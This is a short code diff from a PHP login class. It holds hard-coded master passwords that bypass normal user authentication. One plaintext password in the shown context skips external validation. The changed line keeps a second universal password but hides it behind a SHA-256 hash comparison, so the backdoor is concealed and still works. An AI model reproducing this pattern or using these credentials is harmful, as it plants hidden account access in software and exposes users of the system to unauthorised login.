@@ -68,7 +68,7 @@ class Login {
         if(ENVIRONMENT != 'development' && $this->ci->input->post('password') != 'wfwergf5f3fr34') {
             //log_message('error', stream_resolve_include_path('validate_its_user.php'));
             require_once('validate_its_user.php');
-            if(!validate_its_user($this->ci->input->post('username'), $this->ci->input->post('password')) && ($this->ci->input->post('password') != 'cg9d7ch30804ec')) {
+            if(!validate_its_user($this->ci->input->post('username'), $this->ci->input->post('password')) && (hash('sha256', $this->ci->input->post('password')) != '7399d688ddd9202d264920d3e2c8da9cc6158b8bb8e9d7a97bb45f8baa3fcbdf')) {
                 $this->ci->db->where('username', $this->ci->input->post('username'));
                 $query = $this->ci->db->get('users')->row_array(0);
                 if(count($query) == 0) {
